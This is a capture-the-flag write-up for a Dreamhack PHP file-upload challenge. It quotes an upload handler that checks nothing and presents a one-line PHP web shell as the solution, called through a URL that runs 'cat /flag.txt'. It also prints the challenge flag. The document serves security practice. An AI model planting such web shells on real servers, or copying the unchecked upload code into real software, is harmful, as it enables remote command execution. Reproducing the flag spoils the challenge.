---
title: image-storage
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, File upload vulnerabilities]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/38/](https://dreamhack.io/wargame/challenges/38/)

## Description
> It is a file storage service written in PHP.
>
> Use the file upload vulnerability to obtain the flag. The flag is located in ```/flag.txt```

### Attached

```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
```
{: file="./upload.php" }

## Analyzation

It does not check the file's content. Shell code can be easily uploaded.

## Solution

Upload the ```exploit.php``` file

```php
<?php
echo shell_exec($_GET['command'])
?>
```
{: file="exploit.php" }

(See [php shell_exec() vs exec()](https://stackoverflow.com/questions/7093860/php-shell-exec-vs-exec))

Then call that file

```
http://host3.dreamhack.games:17421/uploads/exploit.php?command=cat%20/flag.txt
```

The flag is

```
DH{c29f44ea17b29d8b76001f32e8997bab}
```